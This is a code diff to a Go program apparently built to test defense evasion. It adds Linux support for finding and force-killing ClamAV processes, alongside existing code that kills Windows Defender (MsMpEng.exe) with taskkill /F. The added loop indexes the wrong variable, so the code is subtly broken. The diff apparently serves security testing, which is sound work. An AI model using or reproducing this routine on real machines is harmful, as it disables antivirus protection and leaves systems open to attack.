@@ -1,9 +1,11 @@
 package main
 
 import (
+	"fmt"
 	"helpers"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 )
 
@@ -12,12 +14,21 @@ type AVEDRExe struct {
 	exe  string
 }
 
-var AVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}}
+var WinAVEDRExecs = []AVEDRExe{AVEDRExe{"Windows Defender", "MsMpEng.exe"}}
+var LinAVEDRExecs = []AVEDRExe{AVEDRExe{"ClamAV", "clam"}}
 
 func checkIfItIsAVEDR(name string) bool {
-	for i := 0; i < len(AVEDRExecs); i++ {
-		if AVEDRExecs[i].exe == name {
-			return true
+	if runtime.GOOS == "windows" {
+		for i := 0; i < len(WinAVEDRExecs); i++ {
+			if WinAVEDRExecs[i].exe == name {
+				return true
+			}
+		}
+	} else {
+		for i := 0; i < len(LinAVEDRExecs); i++ {
+			if LinAVEDRExecs[i].exe == name {
+				return true
+			}
 		}
 	}
 
@@ -38,35 +49,61 @@ func main() {
 	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "DefenseEnvasion")
 	helpers.WriteLog(nameOfLogFile, "Starting test: DefenseEnvasion", 2)
 
-	getProcesses := exec.Command("tasklist")
-	processes, err := getProcesses.Output()
-	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-		os.Exit(2)
-	}
+	if runtime.GOOS == "windows" {
+		getProcesses := exec.Command("tasklist")
+		processes, err := getProcesses.Output()
+		if err != nil {
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			os.Exit(2)
+		}
 
-	processInfo := strings.Split(string(processes), "\n")
-	var AVEDRprocess []string
-	for i := 3; i < len(processInfo); i++ {
-		processFileds := strings.Fields(processInfo[i])
-		if len(processFileds) > 0 {
-			name := processFileds[0]
-			if checkIfItIsAVEDR(name) {
-				AVEDRprocess = append(AVEDRprocess, name)
+		processInfo := strings.Split(string(processes), "\n")
+		var AVEDRprocess []string
+		for i := 3; i < len(processInfo); i++ {
+			processFileds := strings.Fields(processInfo[i])
+			if len(processFileds) > 0 {
+				name := processFileds[0]
+				if checkIfItIsAVEDR(name) {
+					AVEDRprocess = append(AVEDRprocess, name)
+				}
+			}
+
+		}
+
+		for i := 0; i < len(AVEDRprocess); i++ {
+			stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
+			_, err := stopAVEDR.Output()
+			if err != nil {
+				if err.Error() == "exit status 1" {
+					os.Exit(1)
+				} else {
+					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+					os.Exit(3)
+				}
+			}
+		}
+	} else {
+		var AVEDRprocess []string
+		for i := 0; i < len(LinAVEDRExecs); i++ {
+			getpids := exec.Command("/bin/pgrep", LinAVEDRExecs[i].name)
+			pids, _ := getpids.CombinedOutput()
+			pidsstr := strings.Fields(string(pids))
+			for j := 0; j < len(pidsstr); j++ {
+				AVEDRprocess = append(AVEDRprocess, pidsstr[i])
+				fmt.Println(pidsstr[i])
 			}
 		}
 
-	}
-
-	for i := 0; i < len(AVEDRprocess); i++ {
-		stopAVEDR := exec.Command("taskkill", "/IM", AVEDRprocess[i], "/F")
-		_, err := stopAVEDR.Output()
-		if err != nil {
-			if err.Error() == "exit status 1" {
-				os.Exit(1)
-			} else {
-				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
-				os.Exit(3)
+		for i := 0; i < len(AVEDRprocess); i++ {
+			stopAVEDR := exec.Command("kill", "-9", AVEDRprocess[i])
+			err := stopAVEDR.Run()
+			if err != nil {
+				if err.Error() == "exit status 1" {
+					os.Exit(1)
+				} else {
+					helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+					os.Exit(3)
+				}
 			}
 		}
 	}
